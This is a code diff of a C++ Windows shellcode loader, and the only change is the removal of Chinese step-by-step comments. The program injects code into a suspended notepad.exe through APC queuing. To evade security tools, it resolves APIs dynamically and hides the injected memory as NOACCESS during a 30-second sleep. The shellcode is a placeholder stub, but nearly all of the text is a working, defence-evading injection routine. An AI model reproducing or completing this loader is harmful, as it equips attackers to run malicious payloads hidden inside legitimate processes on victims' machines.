@@ -5,7 +5,7 @@
 #include <tlhelp32.h>
 #include <string>
 
-unsigned char shellcode[] = {0x90, 0x90, 0xC3}; // 示例shellcode
+unsigned char shellcode[] = {0x90, 0x90, 0xC3}; 
 
 typedef HANDLE (WINAPI* pOpenProcess)(DWORD, BOOL, DWORD);
 typedef LPVOID (WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
@@ -47,7 +47,7 @@ DWORD GetFirstThreadIdByPid(DWORD pid) {
 }
 
 int main() {
-    // 动态获取API
+    
     pOpenProcess MyOpenProcess = (pOpenProcess)SafeGetProcAddress(L"kernel32.dll", "OpenProcess");
     pVirtualAllocEx MyVirtualAllocEx = (pVirtualAllocEx)SafeGetProcAddress(L"kernel32.dll", "VirtualAllocEx");
     pWriteProcessMemory MyWriteProcessMemory = (pWriteProcessMemory)SafeGetProcAddress(L"kernel32.dll", "WriteProcessMemory");
@@ -59,7 +59,7 @@ int main() {
         std::cout << "动态API获取失败" << std::endl;
         return -1;
     }
-    // 1. 创建挂起的白进程
+    
     STARTUPINFO si = { sizeof(si) };
     PROCESS_INFORMATION pi = { 0 };
     wchar_t szPath[] = L"C:\\Windows\\System32\\notepad.exe";
@@ -68,7 +68,7 @@ int main() {
         std::cout << "创建挂起进程失败" << std::endl;
         return -1;
     }
-    // 2. 申请RW内存并写入shellcode
+    
     LPVOID remoteAddr = MyVirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!remoteAddr) {
         std::cout << "分配内存失败" << std::endl;
@@ -80,24 +80,24 @@ int main() {
         TerminateProcess(pi.hProcess, 0);
         return -1;
     }
-    // 3. 写入后将内存权限改为NOACCESS
+    
     DWORD oldProtect = 0;
     if (!MyVirtualProtectEx(pi.hProcess, remoteAddr, sizeof(shellcode), PAGE_NOACCESS, &oldProtect)) {
         std::cout << "设置NOACCESS失败" << std::endl;
         TerminateProcess(pi.hProcess, 0);
         return -1;
     }
-    // 4. sleep真睡眠（如30秒）
+    
     Sleep(30000);
-    // 5. 注入前恢复为RX
+    
     if (!MyVirtualProtectEx(pi.hProcess, remoteAddr, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldProtect)) {
         std::cout << "恢复RX失败" << std::endl;
         TerminateProcess(pi.hProcess, 0);
         return -1;
     }
-    // 6. APC注入插入线程
+    
     MyQueueUserAPC((PAPCFUNC)remoteAddr, pi.hThread, NULL);
-    // 7. 恢复主线程
+    
     ResumeThread(pi.hThread);
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
